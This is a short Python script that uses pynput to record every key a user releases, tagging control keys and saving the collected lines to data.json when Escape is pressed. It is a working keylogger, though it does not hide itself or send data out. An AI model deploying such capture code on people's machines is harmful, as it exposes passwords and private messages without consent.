#!/usr/bin/env python3
import json

from pynput import keyboard

lines = list()
line = ""


def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)


def on_press(key):
    key_name = get_key_name(key)
    print('Key {} pressed.'.format(key_name))


def on_release(key):
    global lines
    global line

    key_name = get_key_name(key)

    # Check to see if is a control key e.g. Key.space Key.ctrl
    if "Key" in key_name:
        line += " [" + key_name + "] "
        add_line(line)
    else:
        line += key_name

    if key_name == 'Key.esc':
        add_line(line)

        with open('data.json', 'w') as outfile:
            json.dump({'results': lines}, outfile)

        return False


def add_line(l):
    global line

    lines.append(l)
    line = ""


with keyboard.Listener(
        # on_press =on_press,
        on_release=on_release) as listener:

    listener.join()
